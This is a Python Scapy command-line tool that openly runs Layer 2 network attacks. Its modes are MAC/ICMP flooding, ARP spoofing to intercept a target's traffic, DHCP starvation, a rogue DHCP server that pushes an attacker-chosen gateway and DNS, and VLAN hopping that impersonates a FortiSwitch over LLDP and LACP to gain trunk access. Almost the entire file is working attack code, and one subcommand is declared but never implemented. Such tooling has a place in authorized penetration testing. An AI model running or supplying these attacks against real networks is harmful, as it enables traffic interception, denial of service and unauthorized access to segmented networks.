#!/usr/bin/python3

# Requirements: Scapy for Python3 - apt-get install python3-scapy
# 		tcpreplay - apt-get install tcpreplay

import argparse
import os
import threading
import time
import random
import ipaddress

from scapy.all import *
from scapy.contrib.lldp import *
from scapy.contrib.lacp import *

# create parser
main_parser = argparse.ArgumentParser(description='Execute various Layer 2 network attacks.')

subparsers = main_parser.add_subparsers(dest='action')

flood_parser = subparsers.add_parser('flood',help='Flood packages')

vlanhop_parser = subparsers.add_parser('vlanhop',help='VLAN Hopping')

arpspoof_parser = subparsers.add_parser('arpspoof',help='ARP Spoofing')

dhcpexhaustion_parser = subparsers.add_parser('dhcpexhaustion',help='DHCP exhaustion attack')

dhcpserver_parser = subparsers.add_parser('dhcpserver',help='DHCP Server')

dhcpreleaser_parser = subparsers.add_parser('dhcpreleaser',help='DHCP Releaser')


main_parser.add_argument("-v","--verbose", help="Increase output verbosity",action='count',default=0)
main_parser.add_argument("-i","--interface", help="Network Interface",default="ens33")

flood_parser.add_argument("-t","--floodtype",help="Flood type", choices =["unknown_unicast","unknown_multicast","unknown_broadcast"], required=True)
flood_parser.add_argument("-c","--packetcount",help="Amount of packets", default=65000,type=int)
flood_parser.add_argument("-d","--destinationip",help="Destination IP Address",default="0.0.0.0")
flood_parser.add_argument("-dmac","--destinationmac",help="Destination MAC Address",default="00:01:02:03:04:05")

arpspoof_parser.add_argument("-t","--target",help="IP address of the target device whose traffic you wish to intercept.",required=True)
arpspoof_parser.add_argument("-i","--impersonate",help="IP address of the device you want to impersonate to the target.",required=True)
arpspoof_parser.add_argument("-f","--frequency",help="Frequency of ARP replies, default=0.5s",default=0.5)

dhcpexhaustion_parser.add_argument("-c","--count",help="Amount of DHCP requests, default=1000",default=1000,type=int)
dhcpexhaustion_parser.add_argument("-s","--dhcpserver",help="IP of DHCP Server, if known specified, retrieve")

dhcpserver_parser.add_argument("-s","--scope",help="IP Range of provided IPs by the DHCP Server. Format: 192.168.100.20-192.168.100.50",required=True)
dhcpserver_parser.add_argument("-sn","--subnetmask",help="Subnetmask for the provided IPs",required=True)
dhcpserver_parser.add_argument("-g","--gateway",help="Provided the Gateway IP. By default this host will be the gateway",required=True)
dhcpserver_parser.add_argument("-d","--dns",help="Provided single IP address for DNS Server",default="8.8.8.8")
dhcpserver_parser.add_argument("-c","--checkfree",help="Check if offered IP is free",default=False,type=bool)


#vlanhop_parser.add_argument("-a","--activerecon",help="Send additional packets to detect VLANs. Noisy!")
#vlanhop_parser.add_argument("-ac","--autoint",help="Automatically create VLAN interfaces for all detected VLANs")
vlanhop_parser.add_argument("-hn","--hostname",help="Hostname of fake FortiSwitch",default="SWITCH32")
#vlanhop_parser.add_argument("-tn","--trunkname",help="Trunkname for FortiSwitch",default="")
vlanhop_parser.add_argument("-sn","--serialnumber",help="Serialnumber of fake FortiSwitch",default="S108DVWSM12345")


main_args = main_parser.parse_args()
action = main_args.action

if main_args.interface:
   conf.iface=main_args.interface

isl_link_flags = {
   "auto-isl":0,
   "auto-mclag-icl":1,
   "mclag-switch":2,
   "?":3,
   "isl-fortilink":4,
}


event_LACP_Established = threading.Event()


src_mac = ""

# DHCP Leases for DHCP Server
dhcp_leases = {}
dhcp_leases["00:11:22:33:44:55"] = {"ip": "192.168.1.100", "expiry": 5000, "transaction_id":0x123123}

# DHCP Offers for DHCP exhaustion
dhcp_offers = {}
dhcp_offers["00:11:22:33:44:55"] = {"ip": "192.168.1.100", "transaction_id":0x123123}




# level 0 = standard output, level 1 = info, level 2 = debug
def dprint(*args,level=0):
   if level <= main_args.verbose:
      print(' '.join(map(str, args)))

def unicast_randMAC():
   mac = RandMAC()
   mac_list = mac.split(":")
   first_byte = int(mac_list[0], 16) & 0xFE  # Clear the least significant bit
   mac_list[0] = "{:02x}".format(first_byte)
   return ":".join(mac_list)

def mac_to_bin(mac_address):
    return bytes(int(b, 16) for b in mac_address.split(':'))


def allocate_ip(mac):
   global dhcp_leases

   start_ip,end_ip = main_args.scope.split('-')

   start_ip= ipaddress.IPv4Address(start_ip)
   end_ip = ipaddress.IPv4Address(end_ip)

   found_free_ip = False

   while start_ip<=end_ip and not found_free_ip:
      for entry in dhcp_leases.values():
           if entry.get('ip') != start_ip:
               if main_args.checkfree:
                  print("implement check free")
               else:
                  print(start_ip,"is free")
                  dhcp_leases[mac]['ip']=str(start_ip)
                  dhcp_leases[mac]['expiry'] = 5000
                  found_free_ip = True
                  break
      start_ip += 1


def handle_dhcp_packet(packet,transaction_id):
    global dhcp_leases
    global dhcp_offers
    dprint("handle_dhcp_packet(). Options:",packet[DHCP].options[0][1],level=2)
    if DHCP in packet and packet[DHCP].options[0][1] == 2:  # DHCP Offer
        for entry in dhcp_offers.values():
           if entry.get('transaction_id') == packet[BOOTP].xid:
               dhcp_offers[packet[Ether].dst]['ip'] = packet[BOOTP].yiaddr
               send_dhcp_request(packet[Ether].dst)
    if DHCP in packet and packet[DHCP].options[0][1] == 1 and transaction_id == "":  # DHCP Discover
        dhcp_leases[str(packet[Ether].src)] = {"transaction_id":packet[BOOTP].xid}
        allocate_ip(packet[Ether].src)
        send_dhcp_offer(packet[Ether].src)
    if DHCP in packet and packet[DHCP].options[0][1] == 3:  # DHCP Discover
        for entry in dhcp_leases.values():
           if entry.get('transaction_id') == packet[BOOTP].xid:
               send_dhcp_ack(packet[Ether].src)

def send_dhcp_ack(mac):
    global dhcp_leases
    dhcp_lease = dhcp_leases[mac]
    print("Answering DHCP Request")
    dhcp_ack = (
        Ether(dst=mac) /
        IP(dst=dhcp_lease["ip"]) /
        UDP(sport=67, dport=68) /
        BOOTP(op=2,chaddr=mac_to_bin(mac),xid=dhcp_lease["transaction_id"],yiaddr=dhcp_lease["ip"]) /
        DHCP(options=[("message-type", "ack"), ("lease_time",3600), ("subnet_mask","255.255.255.0"),("router",main_args.gateway),("name_server",main_args.dns), "end"])
    )
    sendp(dhcp_ack,verbose=False)


def send_dhcp_offer(mac):
    global dhcp_leases
    dhcp_lease = dhcp_leases[mac]
    dprint(dhcp_lease,level=2)
    dhcp_offer = (
        Ether(dst=mac) /
        IP(dst=dhcp_lease['ip']) /
        UDP(sport=67, dport=68) /
        BOOTP(op=2,chaddr=mac_to_bin(mac),xid=dhcp_lease["transaction_id"],yiaddr=dhcp_lease["ip"]) /
        DHCP(options=[("message-type", "offer"), ("lease_time",3600), ("subnet_mask","255.255.255.0"), "end"])
        )
    sendp(dhcp_offer,verbose=False)


def send_dhcp_discover(mac):
    global dhcp_offers
    dhcp_offer = dhcp_offers[mac]
    #global src_mac
    #mac = mac_to_bin(src_mac)
    dhcp_discover = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(op=1, chaddr=mac_to_bin(mac) + b"\x00" * 10,xid=dhcp_offer['transaction_id']) /
        DHCP(options=[("message-type", "discover"), "end"])
    )
    sendp(dhcp_discover,verbose=False)

def send_dhcp_request(mac):
    global dhcp_offers
    dhcp_offer = dhcp_offers[mac]
    dprint("MAC:",mac,level=2)
    dprint("Transaction_ID:",dhcp_offer['transaction_id'],level=2)
    dhcp_request = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(op=1, chaddr=mac_to_bin(mac) + b"\x00" * 10,xid=dhcp_offer['transaction_id']) /
        DHCP(options=[("message-type", "request"),
                      ("requested_addr", dhcp_offer['ip']),
                      "end"])
    )
    print("Requesting",dhcp_offer['ip'],"...")
    sendp(dhcp_request,verbose=False)

def dhcpexhaustion():
    global src_mac
    global dhcp_offers

    print("Launching DHCP Server exhaustion attack")
    for i in range(main_args.count):
       transaction_id = random.randint(0,0xFFFFFFFF)
       src_mac = unicast_randMAC()
       dhcp_offers[src_mac]= {'transaction_id':transaction_id}
       send_dhcp_discover(src_mac)
       sniff(prn=lambda packet:handle_dhcp_packet(packet,transaction_id), filter="udp and port 68", count=1, timeout=10)


def dhcpserver():
   print("Launching DHCP Server")
   print(main_args.scope)
   start_ip,end_ip = main_args.scope.split('-')
   start_ip= ipaddress.IPv4Address(start_ip)
   end_ip = ipaddress.IPv4Address(end_ip)
   print("Start IP:",start_ip)
   print("End IP:",end_ip)

   subnetmask=main_args.subnetmask

   gateway = ipaddress.IPv4Address(main_args.gateway)

   dns = ipaddress.IPv4Address(main_args.dns)

   print("Listening for Discover packages")

   while(True):
      sniff(prn=lambda packet:handle_dhcp_packet(packet,""), filter="udp and port 68", timeout=100)



def fortilink_isl(lldp_keep_alive):
    print("Establishing FortiLink ISL...",end="",flush=True)

    sendp(lldp_keep_alive,verbose=0)

    packet=sniff(filter="ether proto 0x8809",count=1,timeout=60)
    if not packet:
       print("Failed")
       print("Error: No LACP Packet received")
       return

    lacp_response=packet[0]
    del lacp_response.src
    lacp_response[LACP].actor_system = get_if_hwaddr(conf.iface)
    lacp_response[LACP].actor_system_priority = lacp_response[LACP].actor_system_priority - 1
    sendp(lacp_response,verbose=0)

    packet=sniff(filter="ether proto 0x8809",count=1,timeout=60)

    # Set Partner Settings
    lacp_response[LACP].partner_system_priority = packet[0][LACP].actor_system_priority
    lacp_response[LACP].partner_system = packet[0][LACP].actor_system
    lacp_response[LACP].partner_key = packet[0][LACP].actor_key
    lacp_response[LACP].partner_port_priority = packet[0][LACP].actor_port_priority
    lacp_response[LACP].partner_port_number = packet[0][LACP].actor_port_number

    while True:
       packet = sniff(filter="ether proto 0x8809", count=1, timeout=5)
       if packet:
          if (not event_LACP_Established.is_set() and packet[0][LACP].partner_state & 0b00110000):
             print("LACP Trunk established")
             event_LACP_Established.set()

       # Mirror state of opposite LACP Trunk
          lacp_response[LACP].actor_state = packet[0][LACP].actor_state
          lacp_response[LACP].partner_state = packet[0][LACP].actor_state
       sendp(lacp_response,verbose=0)
       sendp(lldp_keep_alive,verbose=0)
       time.sleep(1)

def arpspoof():
   print("Launching arpspoof attack")
   print("Retrieve MAC for target (",main_args.target,"): ",sep="",end="",flush=True)
   arp_request= ARP(pdst=main_args.target)
   answer = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=main_args.target),timeout=5,verbose=False)
   if len(answer[0]) > 0:
      print (answer[0][0][1].hwsrc)
      targetMAC = answer[0][0][1].hwsrc
   else:
     print("No response")
     return

   print("Retrieve MAC for impersonated host (",main_args.impersonate,"): ",sep="",end="",flush=True)
   arp_request= ARP(pdst=main_args.impersonate)
   answer = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=main_args.impersonate),timeout=5,verbose=False)
   if len(answer[0]) > 0:
      print (answer[0][0][1].hwsrc)
      impersonateMAC = answer[0][0][1].hwsrc
   else:
     print("No response")
     return

   print("ARP Attack running.")
   while True:
      #packet to target
      sendp(Ether(dst=targetMAC)/ARP(op="is-at",psrc=main_args.impersonate,pdst=main_args.target,hwdst=targetMAC),count=1,verbose=False)
      #packet to impersonated host
      sendp(Ether(dst=impersonateMAC)/ARP(op="is-at",psrc=main_args.target,pdst=main_args.impersonate,hwdst=impersonateMAC),count=1,verbose=False)
      time.sleep(main_args.frequency)


def vlanhop(iface=main_args.interface):
    print("Launching vlanhop attack")
    print("Listening for LLDP packets...",end="",flush=True)

    # Listen to LLDP packets
    packet=sniff(filter="ether proto 0x88cc",count=1,timeout=60)

    if (not packet):
       print("timeout")
       dprint("FAIL: No LLDP packet received")
       return

    dprint("received")
    dprint("System name:",packet[0][LLDPDUSystemName].system_name.decode("UTF-8"))
    dprint("System description:",packet[0][LLDPDUSystemDescription].description.decode("UTF-8"))
    dprint("Switchport interface:",packet[0][LLDPDUPortDescription].description.decode("UTF-8"))
    dprint("Switch management address:",inet_ntop(socket.AF_INET,(packet[0][LLDPDUManagementAddress].management_address)))

    if not (b"FortiSwitch" in packet[0][LLDPDUSystemDescription].description):
       print("FAIL: Not a FortiSwitch LLDP Packet")
       return

    lldp_response = packet[0]
    lldp_response[LLDPDUChassisID].id = get_if_hwaddr(conf.iface)
    del lldp_response.src
    del lldp_response[LLDPDUSystemName]._length
    lldp_response[LLDPDUSystemName].system_name = main_args.hostname

    i = 1
    print("Listening for Fortigate LLDP TLVs...",end="",flush=True)
    remoteAutoISL = False
    while packet[0].getlayer(LLDPDUGenericOrganisationSpecific, nb=i):
       org_layer = packet[0].getlayer(LLDPDUGenericOrganisationSpecific, nb=i)
       dprint("Found org code:",org_layer.org_code,level=2)

       if (org_layer.org_code==547598):
          dprint("Forticode found:",org_layer.subtype,level=2)
          #type 1 hostname
          if org_layer.subtype==1:
             dprint("FortiLink Hostname TLV ID 1",level=1)
             lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = main_args.hostname
             del lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i)._length

          #type 2 serial
          elif org_layer.subtype==2:
             dprint("FortiLink Serialnumber TLV ID 2",level=1)
             print("Found")
             print("Switch Serialnumber:",org_layer.data.decode("UTF-8"))
             lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = main_args.serialnumber
             del lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i)._length

          #type 3 port_options
          elif org_layer.subtype==3:
             dprint("FortiLink link properties TLV ID 3",level=1)
             dprint("Link properties:",org_layer.data[3],level=1)
             remoteAutoISL = True
             lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = b"\x00\x00\x02\x5b\x00\x107C08aPXFm8QrATSP"

       i += 1

    if not remoteAutoISL:
       print("Non Found")
       print("FAIL: Switch Auto-ISL is disabled")
       return

    lacp_thread = threading.Thread(target=fortilink_isl,args=(lldp_response,))
    lacp_thread.daemon = True
    lacp_thread.start()

    event_LACP_Established.wait(timeout=65)

    if not event_LACP_Established.is_set():
       print("FAIL: LACP trunk could not be established")

    fortilink_packet=sniff(filter="ether proto 0x88ff",count=1,store=1,timeout=20)

    print("")
    print("To access the VLANs from your host run:  sudo ip link add link ",conf.iface," name ",conf.iface,".<vlan-id> type vlan id <vlan-id>",sep="")
    print("Keep this program running in the background")
    print("")
    print("Detected VLANs (passivly):")

    detected_vlans = []

    while True:
       time.sleep(1)
       vlan_packet=sniff(count=10,timeout=5)
       for single_packet in vlan_packet:
          if (single_packet.haslayer(Dot1Q)):
             if not single_packet[Dot1Q].vlan in detected_vlans:
                 detected_vlans.append(single_packet[Dot1Q].vlan)
                 print(single_packet[Dot1Q].vlan)


def l2_flood(floodtype,iface=main_args.interface):
    print("Launching flood attack:",floodtype)
    ttl=10
    if floodtype == "unknown_multicast":
       print("Generating",main_args.packetcount,"multicast flood packets")
       base_mac_int = int.from_bytes(b'\x04\x00\x00\x00\x00\x00', 'big')
       if main_args.destinationip=="0.0.0.0":
          dstip = "224.0.0.0"
       dst_mac = "11:22:33:44:55:66"
       ttl=1

    if floodtype == "unknown_unicast":
       print("Generating",main_args.packetcount,"unicast flood packets")
       base_mac_int = int.from_bytes(b'\x04\x00\x00\x00\x00\x00', 'big')
       dstip = main_args.destinationip
       if main_args.destinationmac == "00:01:02:03:04:05":
          dst_mac = "10:22:33:44:55:66"

    if floodtype == "unknown_broadcast":
       print("Generating",main_args.packetcount,"broadcast flood packets")
       base_mac_int = int.from_bytes(b'\x0c\x00\x00\x00\x00\x00', 'big')
       dstip = main_args.destinationip
       if main_args.destinationip=="0.0.0.0":
          dstip = "255.255.255.255"
       if main_args.destinationmac == "00:01:02:03:04:05":
          dst_mac = "FF:FF:FF:FF:FF:FF"



    # generate packets in memory
    packet_list = []

    for i in range(1, main_args.packetcount):
        src_mac = ':'.join('%02x' % byte for byte in (base_mac_int + i).to_bytes(6, 'big')) # Iterate over source mac address, add one each loop
        frame = Ether(src=src_mac, dst=dst_mac) / IP(dst=dstip, src=RandIP(), ttl=ttl) / ICMP()
        packet_list.append(frame)

    print("Sending packets...",end="")
    sendpfast(packet_list, iface=iface)
    print("Done")




# Program start

if os.geteuid() != 0:
  print("--- Script not started as root user, possible permissions problem ---")

if action=="flood":
   l2_flood(floodtype=main_args.floodtype)

elif action=="vlanhop":
   vlanhop()

elif action=="arpspoof":
   arpspoof()

elif action=="dhcpexhaustion":
   dhcpexhaustion()

elif action=="dhcpserver":
   dhcpserver()

if not action:
   main_parser.print_help()
